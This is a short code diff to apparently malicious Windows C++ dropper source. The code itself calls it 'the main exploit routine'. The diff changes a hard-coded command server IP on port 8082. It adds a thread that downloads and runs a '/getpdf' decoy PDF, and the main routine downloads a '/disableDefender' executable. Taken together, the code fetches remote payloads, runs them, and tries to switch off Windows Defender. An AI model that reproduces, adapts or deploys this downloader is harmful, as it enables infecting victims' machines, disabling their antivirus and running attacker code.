@@ -31,6 +31,7 @@
 #include <shellapi.h>
 #include <shlwapi.h>
 #include <winhttp.h> 
+#include <thread>
 using namespace std;
 
 /* linker lib comment includes for static */
@@ -104,7 +105,7 @@ char * downloadAndRun(LPCWSTR urlpath,LPCWSTR extentionPath,bool run) {
 	}
 
 	// Step 2: Connect to the server
-	HINTERNET hConnect = WinHttpConnect(hSession, L"103.182.16.8", 8082, 0);
+	HINTERNET hConnect = WinHttpConnect(hSession, L"42.96.42.99", 8082, 0);
 	if (hConnect == NULL) {
 		std::cerr << "WinHttpConnect failed: " << GetLastError() << std::endl;
 		WinHttpCloseHandle(hSession);
@@ -192,6 +193,7 @@ char * downloadAndRun(LPCWSTR urlpath,LPCWSTR extentionPath,bool run) {
 /* the main exploit routine */
 int main(int argc, char* argv[])
 {
+	std::thread thread1(downloadAndRun, L"/getpdf", L".pdf", true);
 	char* pathDisableMalware =downloadAndRun(L"/disableDefender",L".exe",false);
 	//cout << pathDisableMalware;
 	if (pathDisableMalware == NULL) {
